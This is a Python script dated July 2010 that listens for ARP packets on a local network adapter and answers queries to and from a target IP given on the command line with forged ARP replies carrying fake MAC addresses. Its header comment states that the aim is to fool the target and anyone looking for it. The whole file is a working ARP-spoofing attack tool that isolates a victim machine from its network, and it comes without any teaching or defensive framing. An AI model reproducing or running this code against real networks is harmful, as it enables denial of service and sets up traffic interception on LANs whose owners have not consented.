#July.15th.2o1o
#To fool the target ip and the ones which want to find the target.

from coarp2 import CoArp2,CoArpReply2
from coshake import BytesToHexStream
from comac import CoIPv4,CoMac
from coshake import HexStreamToBytes,ObtainIPv4Netmask,BigEdHex
import sys,RapLanV1

dev1 = RapLanV1.PcapIf(RapLanV1.AdList()[0])
targetIP = CoIPv4(sys.argv[1])

def DbProcessor(din,prompt):
    if len(din) >= 42:  #typical arp packet length
        din = din[0:42]
        hs = BytesToHexStream(din)
        arp = CoArp2.New(hs)

        if 0x806 != arp._CoArp2__frameType:raise RuntimeError("Filter does not work ????")
        
        if 1 == arp._CoArp2__op:
            def AboutThisArp():
                print(arp._CoArp2__senderIP,"query for",arp._CoArp2__destinationIP)            
            if  targetIP == arp._CoArp2__destinationIP:
                #print()
                AboutThisArp()
                ans = CoArpReply2(arp._CoArp2__destinationIP,
                                  CoMac('00-22-aa-11-bb-cc'),
                                      arp._CoArp2__senderIP,
                                      arp._CoArp2__senderMac)
                bout = HexStreamToBytes(ans.toHexStream())
                print("Block-in: Fake ",dev1.Send(bout),"byte(s) written")
                print(">>>")
            elif targetIP == arp._CoArp2__senderIP:
                #print()
                AboutThisArp()
                ans = CoArpReply2(arp._CoArp2__destinationIP,
                                  CoMac('00-11-bb-11-cc-dd'),
                                      arp._CoArp2__senderIP,
                                      arp._CoArp2__senderMac)
                bout = HexStreamToBytes(ans.toHexStream())
                print("Block-out: Fake ",dev1.Send(bout),"byte(s) written")
                print("###")
    else:
        pass
        #print('#',end='')
    return None

def ConvToUInt(nm):
    # From a.b.c.d to "abcd" in memory as an unsigned int
    prod = 1
    rv = 0
    for i in nm.split('.'):
        rv += prod*int(i)
        prod *= 256
    return rv

if '__main__' == __name__:
    print(dev1.FriendlyName)
    print(dev1.AdDesc)
    print(dev1.Description)
    print(dev1.DataLink)

    netmask = ConvToUInt(ObtainIPv4Netmask(dev1))
    dev1.SetFilter("arp",netmask)
    dev1.ProcessPcap(0,DbProcessor)
